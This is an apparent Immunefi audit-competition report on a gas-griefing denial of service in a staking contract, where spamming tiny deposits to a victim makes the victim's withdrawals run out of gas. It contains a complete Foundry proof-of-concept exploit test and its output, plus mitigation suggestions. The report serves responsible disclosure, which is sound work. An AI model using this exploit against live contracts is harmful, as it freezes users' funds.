# 57717 sc medium attacker can spam tiny stakes to a victim and make their withdrawal run out of gas griefing dos&#x20;

**Submitted on Oct 28th 2025 at 12:17:54 UTC by @manvi for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57717
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>

Impacts:

* Temporary freezing of NFTs for at least 24 hour
* Griefing (attacker has no profit motive, but harms users or the protocol)
* Unbounded gas consumption

## Description

### Brief / Intro

The Staking flow creates a fresh stake entry for every deposit(assets, receiver). Withdraw/redeem scans and pops across all of a user's stake entries. Because ERC-4626 allows deposit(…, receiver) by anyone, an attacker can spam thousands of tiny deposits to a victim, making the victim’s withdraw path O(n) and practically fail under normal gas — temporarily freezing their funds.

### Vulnerability Details

While reviewing `contracts/v2/periphery/Staking.sol`:

* Each call to `_deposit(...)` appends a new stake entry. There is no merge/min-size/cap per user.
* The withdraw path (via the unlocked-shares consumer) iterates and pops entries until it gathers enough unlocked shares.
* ERC-4626 allows `deposit(…, receiver)` by anyone, so an attacker can create thousands of entries for the victim without their consent.
* From tests, once a victim's stake entry count is large (e.g., 5k–10k), withdraw/redeem becomes gas-bounded and reverts with typical gas settings. With fewer entries, the same call succeeds — this is a gas-scaling DoS rather than a logic bug.

### Impact Details

* Attacker can make a victim's withdraw uneconomical or revert due to gas limits.
* Victim cannot withdraw under normal gas caps and would need exceptional gas or state changes.
* Cost/effort for the attacker scales linearly with the number of attacker-created entries; the attack is cheap since attacker only needs to pay spam gas and needs no approvals or roles.

> File referenced: `contracts/v2/periphery/Staking.sol`

## Proof of Concept

I wrote a Foundry test against the repo that:

* Deploys `Staking` and a simple ERC-20 mock.
* Victim stakes normally.
* Attacker loops `deposit(1, victim)` thousands of times, creating thousands of victim entries.
* Advance time past the lock.
* Call `withdraw` from the victim with a low/typical gas cap → it reverts due to the O(n) scan; with a very high gas cap, it succeeds, proving gas-based DoS.

File location: `poc/PoC_Staking_Griefing.t.sol`

<details>

<summary>PoC file content (click to expand)</summary>

```solidity
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Staking}  from "../contracts/v2/periphery/Staking.sol";
import {USDCMock} from "../contracts/mocks/Erc20Example.sol";

contract MiniERC1967Proxy {
    bytes32 private constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d38     2bbc;
    constructor(address implementation, bytes memory initCalldata) payable {
        assembly { sstore(_IMPLEMENTATION_SLOT, implementation) }
        if (initCalldata.length != 0) {
            (bool ok, bytes memory ret) = implementation.delegatecall(initCalldata);
            if (!ok) assembly { revert(add(ret, 0x20), mload(ret)) }
        }
    }
    fallback() external payable {
        assembly {
            let impl := sload(_IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result case 0 { revert(0, returndatasize()) } default { return(0, returndatasize()) }
        }
    }
    receive() external payable {}
}

contract PoC_Staking_Griefing is Test {
    Staking  internal staking;
    USDCMock internal long;

    address internal owner    = makeAddr("owner");
    address internal treasury = makeAddr("treasury");
    address internal attacker = makeAddr("attacker");
    address internal victim   = makeAddr("victim");

    function setUp() public {
        long = new USDCMock();
        Staking impl = new Staking();
        bytes memory initData =
            abi.encodeWithSelector(Staking.initialize.selector, owner, treasury, address(long));
        MiniERC1967Proxy proxy = new MiniERC1967Proxy(address(impl), initData);
        staking = Staking(payable(address(proxy)));

        long.mint(attacker, 10_000_000 ether);
        vm.prank(attacker);
        long.approve(address(staking), type(uint256).max);
    }

   function test_griefing_spam_and_withdraw_reverts_on_low_gas()   public {
        uint256 spamCount = 5000;      // lots of tiny stakes
        uint256 tiny      = 1;
        uint256 toWithdraw = 4000;     // force scan across thousands of entries

        // Attacker griefs victim with many tiny deposits => many stake entries for victim
       for (uint256 i; i < spamCount; ++i) {
            vm.prank(attacker);
            staking.deposit(tiny, victim); // ERC4626 deposit(assets, receiver)
       }

        // Make stakes withdrawable
        vm.warp(block.timestamp + 365 days);

        // Low-gas attempt withdrawing a large chunk must revert due to O(n) iteration
        bytes memory callData =
            abi.encodeWithSelector(staking.withdraw.selector, toWithdraw, victim, victim);

        vm.prank(victim);
        (bool okLow, ) = address(staking).call{gas: 80_000}(callData);
        assertTrue(!okLow, "low-gas withdraw unexpectedly succeeded (should revert from O(n) gas)");

        // Control: with plenty of gas, the same withdraw succeeds
        uint256 beforeBal = long.balanceOf(victim);
        vm.prank(victim);
        staking.withdraw(toWithdraw, victim, victim);
        uint256 afterBal = long.balanceOf(victim);
        assertEq(afterBal - beforeBal, toWithdraw, "normal-gas withdraw must succeed");
   }
}
```

</details>

<details>

<summary>How to run the PoC (click to expand)</summary>

Run from repo root:

```
$ forge test -vv --match-test griefing_spam_and_withdraw_reverts_on_low_gas
```

Console output (excerpt):

```
$ forge test -vv --match-test griefing_spam_and_withdraw_reverts_on_low_gas
[⠊] Compiling...
[⠢] Compiling 1 files with Solc 0.8.27
[⠆] Solc 0.8.27 finished in 4.14s
Compiler run successful!

Ran 1 test for poc/PoC_Staking_Griefing.t.sol:PoC_Staking_Griefing
[PASS] test_griefing_spam_and_withdraw_reverts_on_low_gas() (gas: 234498601)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 201.54ms (200.35ms CPU time)
```

</details>

## What the PoC proved

* An arbitrary attacker can repeatedly call `deposit(…, receiver=victim)` to create thousands of tiny stake entries for the victim (no merge/min-size guard in `_deposit`).
* When the victim later tries to withdraw, the contract's `_consumeUnlockedSharesOrRevert` must iterate across entries (O(n)) to assemble unlocked shares.
* The test shows that, after spam, a victim's withdraw reverts under a reasonable gas cap — demonstrating a practical griefing DoS.
* The attacker needs no approvals/roles and does not take custody of the victim's funds — only pays spam gas, making the attack cheap and repeatable.

{% hint style="warning" %}
Mitigation approaches include:

* Merge consecutive stakes for the same receiver into a single entry (or maintain aggregated balances per receiver + timestamped buckets).
* Enforce a minimum deposit size or a per-receiver cap on pending stake entries.
* Change withdraw logic to avoid linear scans over unbounded per-user arrays (e.g., use efficient data structures or index pointers, paginate, or allow users to sweep entries in smaller chunks). Note: Do not add any mitigation not already present in the original report — these are generic suggestions.
  {% endhint %}
